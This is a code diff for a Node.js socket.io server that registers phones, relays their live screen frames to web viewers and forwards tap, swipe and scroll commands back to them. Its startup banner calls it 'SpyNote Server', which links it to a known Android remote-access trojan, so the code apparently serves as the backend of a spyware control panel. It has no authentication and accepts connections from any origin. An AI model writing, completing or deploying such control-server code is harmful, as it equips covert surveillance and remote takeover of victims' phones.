@@ -10,23 +10,32 @@ const io = socketIo(server, {
     cors: { origin: "*", methods: ["GET", "POST"] },
     pingTimeout: 60000,
     pingInterval: 25000,
-    maxHttpBufferSize: 200 * 1024 * 1024, // INCREASED BUFFER
-    transports: ['websocket']
+    maxHttpBufferSize: 100 * 1024 * 1024 // ✅ 100MB for frames
 });
 
 app.use(compression());
 app.use(express.static('public'));
-app.use(express.json({ limit: '200mb' }));
-app.use(express.urlencoded({ limit: '200mb', extended: true }));
+app.use(express.json({ limit: '100mb' }));
+app.use(express.urlencoded({ limit: '100mb', extended: true }));
 
 const devices = new Map();
+
+app.post('/register', (req, res) => {
+    const { deviceId, model, brand, version, status } = req.body;
+    if (deviceId) {
+        devices.set(deviceId, { model, brand, version, status, connected: true });
+        console.log("✅ Device registered:", deviceId);
+        io.emit('devices-update', Array.from(devices.entries()));
+    }
+    res.json({ success: true });
+});
 
 app.get('/devices', (req, res) => {
     res.json(Array.from(devices.entries()));
 });
 
 io.on('connection', (socket) => {
-    console.log('🔌 Client connected:', socket.id);
+    console.log('🔌 Web client connected:', socket.id);
 
     socket.on('register-device', (deviceInfo) => {
         const deviceId = deviceInfo.deviceId;
@@ -37,16 +46,17 @@ io.on('connection', (socket) => {
                 socketId: socket.id 
             });
             socket.join(deviceId);
-            console.log("📱 Device LIVE:", deviceId, deviceInfo.model);
+            console.log("📱 Device joined:", deviceId);
             io.emit('devices-update', Array.from(devices.entries()));
         }
     });
 
-    // 🔥 HIGH QUALITY SCREEN - NO BLUR
+    // ✅ PERFECT Screen Streaming
     socket.on('screen-frame', (data) => {
         const deviceId = data.deviceId;
-        if (devices.has(deviceId)) {
-            socket.broadcast.emit('screen-update', {
+        if (devices.has(deviceId) && devices.get(deviceId).connected) {
+            // Broadcast to all web clients watching this device
+            socket.to(deviceId).emit('screen-update', {
                 deviceId,
                 data: data.data,
                 width: data.width,
@@ -56,29 +66,30 @@ io.on('connection', (socket) => {
         }
     });
 
-    // 🔥 LAYOUT BROADCAST
-    socket.on('ui-layout', (data) => {
-        const deviceId = data.deviceId;
-        if (devices.has(deviceId)) {
-            socket.broadcast.emit('ui-layout-update', data);
-        }
-    });
-
-    // 🔥 CONTROL TO DEVICE
+    // ✅ PERFECT Controls (Tap/Swipe/Scroll)
     socket.on('control', (data) => {
-        const { deviceId, action, x, y, startX, startY, endX, endY, scrollDistance } = data;
-        if (devices.has(deviceId)) {
-            socket.to(deviceId).emit('control', data);
-            console.log('🎮', action, '→', deviceId);
+        const { deviceId, action, x, y, startX, startY, endX, endY, duration } = data;
+        if (devices.has(deviceId) && devices.get(deviceId).connected) {
+            socket.to(deviceId).emit('control', {
+                action,
+                x: parseFloat(x) || 0,
+                y: parseFloat(y) || 0,
+                startX: parseFloat(startX) || 0,
+                startY: parseFloat(startY) || 0,
+                endX: parseFloat(endX) || 0,
+                endY: parseFloat(endY) || 0,
+                duration: parseInt(duration) || 300
+            });
+            console.log('🎮 Control:', action, '->', deviceId);
         }
     });
 
     socket.on('disconnect', () => {
-        for (let [deviceId, info] of devices) {
+        for (const [deviceId, info] of devices.entries()) {
             if (info.socketId === socket.id) {
                 devices.set(deviceId, { ...info, connected: false });
                 io.emit('devices-update', Array.from(devices.entries()));
-                console.log('📱 Device OFFLINE:', deviceId);
+                console.log('📱 Device disconnected:', deviceId);
                 break;
             }
         }
@@ -87,5 +98,5 @@ io.on('connection', (socket) => {
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    console.log(`🚀 Server CLEAR: http://localhost:${PORT}`);
+    console.log(`🚀 SpyNote Server: http://localhost:${PORT}`);
 });
